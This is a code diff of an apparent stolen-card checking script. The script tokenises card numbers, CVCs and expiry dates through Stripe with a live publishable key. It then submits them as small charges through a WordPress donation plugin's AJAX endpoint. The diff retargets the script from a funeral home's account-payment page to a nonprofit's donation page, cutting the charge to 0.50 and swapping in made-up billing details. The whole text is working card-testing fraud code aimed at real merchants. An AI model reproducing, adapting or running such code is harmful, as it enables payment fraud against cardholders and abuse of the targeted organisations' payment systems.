@@ -29,7 +29,7 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&billing_details[name]=Kuroshio&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F78c7eece1c%3B+stripe-js-v3%2F78c7eece1c%3B+card-element&key=pk_live_51JNN5kCPT27SWWccxqzoGW8uBAVSg8XaS1aFtpbAD8nRcPLmqOyajKoGVA3Pfh9mgZ7EBGaro0mS9BrLxwO2yCmH00ssRNida2'
+	data = f'type=card&billing_details[name]=JessSmith&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F328730e3ee%3B+stripe-js-v3%2F328730e3ee%3B+card-element&key=pk_live_X8I5Jg4Cf3h2FfLSP7fZ2JwS'
 	
 	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
@@ -40,8 +40,8 @@ def Tele(ccx):
 	    'Accept-Language': 'en-US,en;q=0.9',
 	    'Connection': 'keep-alive',
 	    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    'Origin': 'https://brendanennisfunerals.ie',
-	    'Referer': 'https://brendanennisfunerals.ie/pay-funeral-account/',
+	    'Origin': 'https://www.massairspace.org',
+	    'Referer': 'https://www.massairspace.org/donate/',
 	    'Sec-Fetch-Dest': 'empty',
 	    'Sec-Fetch-Mode': 'cors',
 	    'Sec-Fetch-Site': 'same-origin',
@@ -54,22 +54,24 @@ def Tele(ccx):
 	
 	data = {
 	    'action': 'wp_full_stripe_inline_donation_charge',
-	    'wpfs-form-name': 'pay-funeral-account',
+	    'wpfs-form-name': 'inline-donations',
 	    'wpfs-form-get-parameters': '%7B%7D',
 	    'wpfs-custom-amount': 'other',
-	    'wpfs-custom-amount-unique': '1',
+	    'wpfs-custom-amount-unique': '0.50',
 	    'wpfs-donation-frequency': 'one-time',
-	    'wpfs-custom-input[]': [
-	        'Kuroshio',
-	        '27 Allen St',
-	        '9075613805',
-	    ],
+	    'wpfs-billing-name': 'JessSmith',
+	    'wpfs-billing-address-line-1': '27 Allen St',
+	    'wpfs-billing-address-line-2': '',
+	    'wpfs-billing-address-city': 'New York ',
+	    'wpfs-billing-address-state': 'New York ',
+	    'wpfs-billing-address-zip': '10002',
+	    'wpfs-billing-address-country': 'US',
 	    'wpfs-card-holder-email': 'emoji2292299@gmail.com',
-	    'wpfs-card-holder-name': 'Kuroshio',
+	    'wpfs-card-holder-name': 'JessSmith',
 	    'wpfs-stripe-payment-method-id': f'{pm}',
 	}
 	
-	response = requests.post('https://brendanennisfunerals.ie/wp-admin/admin-ajax.php', headers=headers, data=data)
+	response = requests.post('https://www.massairspace.org/wp-admin/admin-ajax.php', headers=headers, data=data)
 	
 	result = response.json()['message']
 	
